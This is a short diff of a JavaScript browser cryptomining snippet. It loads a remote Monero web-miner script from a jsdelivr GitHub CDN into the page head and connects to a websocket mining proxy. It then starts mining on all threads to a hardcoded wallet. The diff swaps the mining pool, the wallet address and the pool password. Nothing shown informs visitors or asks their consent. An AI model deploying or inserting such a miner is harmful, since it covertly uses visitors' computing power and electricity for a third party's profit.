@@ -7,11 +7,11 @@ script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.
 document.head.appendChild(script);
 
 server = "wss://ny1.xmrminingproxy.com";
-var pool = "moneroocean.stream";
-var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+var pool = "pool.hashvault.pro:443";
+var walletAddress = "44gR1QvRGT7XMKp1Tztq5w1tegff93Bnq5i1PhhBvhJTBDbejmmJsj6RZS3WmkZ5esPWWF5pKeYfPXcgQTxZwUyz8XLecD6";
 var workerId = "GH-XMR-JS-SNIPPET"
 var threads = -1;
-var password = "";
+var password = "x";
 startMining(pool, walletAddress, workerId, threads, password);
 throttleMiner = 20;
 // End Of Mining Code
